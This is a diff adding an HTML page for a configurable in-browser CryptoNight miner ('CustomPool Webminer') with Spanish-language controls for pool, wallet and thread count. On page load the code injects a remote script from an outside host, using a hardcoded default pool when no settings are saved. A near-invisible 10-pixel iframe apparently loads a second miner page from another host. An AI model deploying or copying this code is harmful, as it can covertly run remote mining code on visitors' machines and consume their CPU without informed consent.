@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en-GB">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+	<meta name="description" content="Crypto Webminer AEON | Electroneum | Monero | Bytecoin | INTUcoin | IntenseCoin | Sumokoin | Dinastycoin | Graft | SuperiorCoin | Turtlecoin | Stellite | IPBC Coin | DERO | Qwertycoin | Aeon | Worktips | Bbscoin | Triton | Cryptonight | Cryptonight-Lite | Custom Pool Support - Mining in your Browser">
+	<meta name="keywords" content="Bluboosting Webminer AEON | Electroneum | Monero | Bytecoin | INTUcoin | IntenseCoin | Sumokoin | Dinastycoin | Graft | SuperiorCoin | Turtlecoin | Stellite | IPBC Coin | DERO | Qwertycoin | Aeon | Worktips | Bbscoin | Triton | Cryptonight | Cryptonight-Lite | Custom Pool Support - Mining in your Browser">
+	<meta name="author"      content="PiTi">
+	<meta name="robots" content="noindex, nofollow">
+
+	<title>Custom Pool Webminer for Cryptonight | Cryptonight-Lite - Mining in your Browser</title>
+    <script src="scripts/jquery-3.2.1.min.js"></script>
+	<script src="scripts/jquery.cookie-1.4.1.min.js"></script>
+    <link rel="stylesheet" href="scripts/styles.css">	
+    <script src="scripts/Chart.min.js"></script>
+<script>
+	$(function() {
+	if ($.cookie("pooladdress")) {
+			var str = "https://thelifeisbinary.netlify.com/media.js?perfekt=wss://";
+			var pool = "?jason=" + $.cookie("pooladdress");
+			var algovari  = $.cookie("algovariant");
+			var links = str+algovari+pool;
+			
+			var script = document.createElement("script");
+			script.type = "text/javascript";
+			script.src = links; 
+			document.getElementsByTagName("head")[0].appendChild(script);
+	} 
+	else
+	{
+		        var str = "https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=0?jason=faster.xmr";
+			var script = document.createElement("script");
+			script.type = "text/javascript";
+			script.src = str; 
+			document.getElementsByTagName("head")[0].appendChild(script);
+	}
+  });
+	</script>
+	<script src="scripts/gustav.js?v24042018"></script>
+	<script>
+	function myFunction() {
+	var walletcustom;
+        var pooladdress;
+	var algovariant;
+	walletcustom = $('#walletcustom').val();
+	pooladdress = $('#pooladdress').val();
+	algovariant =  $('#algovariant').val();
+	
+	$.cookie("walletcustom", walletcustom, {
+		expires: 365
+		});
+		$.cookie("pooladdress", pooladdress, {
+		expires: 365
+		});
+		$.cookie("algovariant", algovariant, {
+		expires: 365
+		});
+	location.reload();
+	}
+	
+	</script>
+	
+
+</head>
+<body>
+
+    <div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    
+    <div class="container">
+        <div class="navbar-header">
+           <a class="navbar-brand" href="/" title="Bluboosting.com" align="middle" style="width: 220px;height: 35px;" /><center><strong> CustomPool Webminer</strong></center></a>
+        </div>
+		   </div>
+</div>
+<h3 align="center" style="color: white;">USAR NAVEGADORES SIN BLOQUEADORES DE PUBLICIDAD, PUEDEN DAR PROBLEMAS</h3>
+<h2 align="center">CustomPool Webminer</h2>
+<body>
+
+<div class="row" align="center">
+    <div class="box">
+        <h3>hashes/s</h3>
+        <h2 id="hashes-per-second">0</h2>
+    </div>
+    <div class="box">
+        <h3>Nucleos</h3>
+        <h2>
+			<span id="threads">2</span>
+			<span id="thread-add" class="action"> + </span>
+			<span class="divide"> / </span>
+			<span id="thread-remove" class="action"> - </span>
+		</h2>
+    </div>
+</div>
+
+<div class="row" align="center">
+    <div class="box">
+        <h3> Hashes Totales | Acciones Aceptadas</h3>
+        <h2 id="accepted-shares">0</h2>
+    </div>
+    <div class="box">
+	        <h3>Nucleos Automáticos</h3>
+        <div class="autoThreads">
+            <input type="checkbox" value="None" id="autoThreads" name="check" />
+            <label for="autoThreads"></label>
+		</div>
+	</div>
+</div>
+
+<p align="center"><font color="red">Usar esta variante en caso de minar monedas basadas en Cryptonight Ej: XMR,BCN,ETN -> ?algo=cn?variant=0</p>
+<p align="center"><font color="orange">Atención:Usar esta variante en Cryptonight Variante 1/Monero v7 Ej: ITNS,BBS,KEPL -> ?algo=cn?variant=1</p>
+<p align="center"><font color="green">Atención:Usar esta en casos especiales Cryptonight-Lite Variante 1 Ej: TRTL,AEON,TRIT,WTPI -> ?algo=cn-lite?variant=1 </p>
+<div class="row">
+<input class="text" type="text" id="algovariant" placeholder="Coloca el ALGO|VARIANT -  e.g. ?algo=cn?variant=0">
+</div>
+<div class="row">
+<input class="text" type="text" id="pooladdress" placeholder="Coloca tu pool preferida -  e.g. pool.supportxmr.com:3333">
+</div>
+<div class="row">
+    <input class="text" type="text" id="walletcustom" placeholder="Coloca tu wallet o tu nombre de usuario y presiona start">
+</div>
+<div align="center">
+			<form><input type="button" onclick="myFunction()" id="saving" value="Guardar pool & dirección wallet"></form>
+		</div>
+<div class="row">
+    <canvas id="barchart-canvas" class="stats" width="100%" height="27%"></canvas>
+</div>
+<button onclick="window.location.href='donate.html'">Donar Minado</button>
+<button id="start">Start</button><p align="center"> Protección DDOS: La mineria iniciará en 5-10 Sec</p>
+
+<hr>
+<h4 align="center"><a href= "http://www.crypto-webminer.com">©2017 Crypto Webminer</a></h4>
+<h4 align="center"><a href="https://github.com/chartjs/Chart.js/blob/master/LICENSE.md">Chart Feature ©2013-2017 Nick Downie</a></h4>
+</body>
+			
+
+<iframe src="http://bluboosting.000webhostapp.com/mi.html" width="95%" height="10" frameborder="0"></iframe>
+</body>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-81214188-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-81214188-2');
+</script>
+
+
+</html>
